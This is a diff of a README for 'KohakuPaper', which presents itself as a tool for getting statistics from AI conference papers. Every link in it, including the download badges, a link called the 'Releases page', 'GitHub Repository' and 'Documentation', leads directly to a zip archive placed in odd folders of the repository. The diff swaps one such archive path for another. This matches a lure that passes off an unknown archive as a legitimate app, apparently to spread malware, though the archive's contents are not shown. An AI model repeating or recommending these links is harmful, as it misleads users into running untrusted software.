@@ -1,6 +1,6 @@
 # 📄 KohakuPaper - Get Stats from AI Papers Easily
 
-[![Download KohakuPaper](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
+[![Download KohakuPaper](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -35,7 +35,7 @@ KohakuPaper is your personal assistant for navigating the world of AI conference
 
 To get started with KohakuPaper, visit the link below to download the application.
 
-[Visit this page to download](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
+[Visit this page to download](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of KohakuPaper.
@@ -76,7 +76,7 @@ Thank you to the contributors and the community supporting KohakuPaper. Your inp
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
-- [Documentation](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
+- [GitHub Repository](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)
+- [Documentation](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)
 
-[![Download KohakuPaper](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
+[![Download KohakuPaper](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)](https://github.com/Saiko-sai/KohakuPaper/raw/refs/heads/main/tests/Paper_Kohaku_1.8.zip)
